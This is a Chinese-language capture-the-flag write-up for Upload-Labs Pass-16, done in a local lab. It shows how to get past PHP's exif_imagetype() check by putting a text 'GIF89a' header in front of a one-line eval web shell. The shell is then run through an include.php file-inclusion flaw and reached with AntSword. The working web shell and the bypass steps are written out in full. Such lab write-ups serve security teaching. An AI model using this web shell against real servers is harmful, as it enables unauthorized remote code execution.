【Upload-Labs】Pass-16 exif_imagetype 检测与文件包含 Writeup

操作者：何芊宏 | 操作日期：2026.11.03 | 分类：CTF | 标签：Upload-Labs, Web, 文件上传, exif_imagetype, 文件包含, WebShell

1. 题目信息

  • 平台：Upload-Labs (本地 phpStudy 环境)
  • 分类：Web - 文件上传
  • 题目名称：Pass-16 (exif_imagetype 检测 + 文件包含)
  • 提示：服务端使用 exif_imagetype() 验证图片，必须绕过检测并利用 include.php 触发执行。

2. 核心原理与前置分析

本关卡源码使用 exif_imagetype() 函数对上传文件进行校验。与上一关的 getimagesize() 不同，exif_imagetype() 仅读取文件的前几个字节（魔数），不解析宽高结构。

因此，我们可以直接使用纯文本伪造文件头（如 GIF89a），并在其后拼接 PHP 代码。由于文件全为纯文本，不包含任何导致 PHP 引擎崩溃的二进制乱码，文件被包含时能够完美执行。

3. 工具配置与操作步骤

工具配置：中国蚁剑

  • URL 地址：http://127.0.0.1:8081/include.php?file=upload/真实文件名.gif
  • 连接密码：cmd；编码：UTF-8。

操作步骤与解析：

第一步：制作纯文本图片马

新建一个文本文档，写入以下内容（保存为 UTF-8 无 BOM 格式）：

GIF89a
<?php @eval($_POST['cmd']); ?>

将文件重命名为 test16.gif。

第二步：上传并获取真实路径

在 Pass-16 页面上传该文件。服务端读取到 GIF89a 魔数，判定为合法 GIF 并放行。右键点击页面上的破图，复制其真实 URL 路径（如 6020261103184833.gif）。

第三步：包含触发与连接

浏览器访问 http://127.0.0.1:8081/include.php?file=upload/6020261103184833.gif。页面输出 GIF89a，无报错。

打开蚁剑，填入该包含地址，密码为 cmd，测试连接成功，获取服务器权限。随后清理上传的文件。

4. 踩坑记录与复盘

  • 魔数检测的局限性：exif_imagetype() 的安全级别极低，仅靠伪造开头几个字节就能绕过。在 CTF 实战中，遇到此类函数校验，优先考虑纯文本构造文件头。
  • 包含时的编码安全：使用纯文本 GIF89a 配合 PHP 代码，完美规避了二进制图片被包含时可能导致的 Parse error。

5. 知识点总结

  • exif_imagetype 绕过：理解该函数只读取文件头魔数的特性，可通过纯文本伪造 GIF89a 实现绕过。
  • 文件包含漏洞：通过 include.php 触发恶意文件执行，是典型的“上传+包含”组合漏洞。
